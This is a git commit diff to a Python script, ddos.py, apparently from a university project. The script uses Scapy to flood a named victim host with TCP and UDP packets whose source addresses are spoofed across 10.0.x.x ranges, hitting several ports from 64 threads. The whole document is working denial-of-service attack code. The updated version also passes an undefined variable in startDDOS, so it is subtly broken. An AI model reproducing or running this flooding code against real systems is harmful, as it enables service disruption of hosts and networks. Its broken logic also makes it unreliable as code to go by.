501679fe121d6db7fd1b29ad7a6bf91ec367e286
mark-wilmes <mawi0949@colorado.edu>
2017-10-14 15:39:25 -0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -4,13 +4,14 @@ import time
 
 def sendPackets(subnetMin,subnetMax,victimAddress,victimPort):
 	for i in range(subnetMin,subnetMax):
-		for j in range(1,255):
-			packetTCP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/TCP(dport=victimPort)
-			packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=victimPort)
-			send(packetTCP)
-			send(packetUDP)
-			#print("victim sees 10.0." + str(i) + "." + str(j))
-			time.sleep(1)
+		for j in range(0,255):
+			for port in victimPort:
+				packetTCP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/TCP(dport=port)
+				packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=port)
+				send(packetTCP)
+				send(packetUDP)
+				print("victim sees 10.0." + str(i) + "." + str(j))
+				time.sleep(1)
 
 
 def startDDOS(victimAddress,victimPort,numThreads):
@@ -18,9 +19,8 @@ def startDDOS(victimAddress,victimPort,numThreads):
 		threadRange = 256/numThreads
 		rangeMin = i*int(threadRange) - (int(threadRange)-1)
 		rangeMax = i*int(threadRange)
-		for port in victimPort:
-			thread = Thread(target=sendPackets,args=(rangeMin,rangeMax,victimAddress,int(port)))
-			thread.start()
+		thread = Thread(target=sendPackets,args=(rangeMin,rangeMax,victimAddress,int(port)))
+		thread.start()
 
 ports = ["22","80","8080","3333","1234"]
 startDDOS("eos-leaf-1",ports,64)
